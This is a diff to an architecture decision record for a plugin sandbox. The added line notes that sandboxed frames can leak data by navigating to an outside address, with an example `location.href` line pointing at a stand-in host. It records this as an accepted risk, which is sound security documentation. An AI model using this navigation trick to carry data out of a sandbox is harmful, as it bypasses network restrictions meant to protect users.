@@ -55,6 +55,7 @@ Plugin code is TypeScript or JavaScript, which `vtt-plugin pack` compiles before
 ## Consequences
 
 - Plugin code in the browser reaches the app only through the bridge: it cannot read the page, the session or other documents, or call the API. The e2e fixture's `probe` node checks this in every browser.
+- "No network" means no fetching: the policy stops requests, but no browser lets a page stop a frame from navigating itself, and `location.href = 'https://elsewhere/?hp=…'` sends whatever the frame was given in the address. Every browser does this (checked in T-1703). A frame gets only what the viewer sees, and code still needs an admin's acknowledgement (ADR-020), so the trust model stands; the security review records it as an accepted risk. (Amended 2026-11-13.)
 - Each custom node and card is a frame with its own copy of React (about 300 KB of HTML, cached once). A sheet with many custom nodes costs more memory than before.
 - A frame takes its height after it renders, so custom nodes and cards appear a moment after the rest of the sheet.
 - Components that relied on the page, such as portals, focus moving between a node and the sheet, or reading app state, no longer work. The SDK never offered these.
